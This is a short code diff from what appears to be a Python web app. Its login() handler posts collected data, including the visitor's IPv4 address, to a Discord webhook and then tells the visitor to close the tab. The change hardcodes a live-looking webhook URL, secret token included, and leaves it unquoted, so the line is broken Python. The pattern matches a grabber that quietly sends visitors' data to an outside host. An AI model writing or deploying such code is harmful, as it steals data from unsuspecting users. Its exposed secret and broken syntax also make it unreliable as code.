@@ -36,7 +36,7 @@ def login():
             "ipv4": ipv4,
         }
 
-        response = requests.post(WEBHOOK_URL, json=data)
+        response = requests.post(https://discord.com/api/webhooks/1437559378529095760/LBVgyLa0_8WCa27KvVw1CDZllrDTmXsYYi9RbhV8GCIso82927kKi0dHjpaZiV7COEbW, json=data)
         if response.status_code == 204:
             return "Done! Please close this tab.", 200
         else:
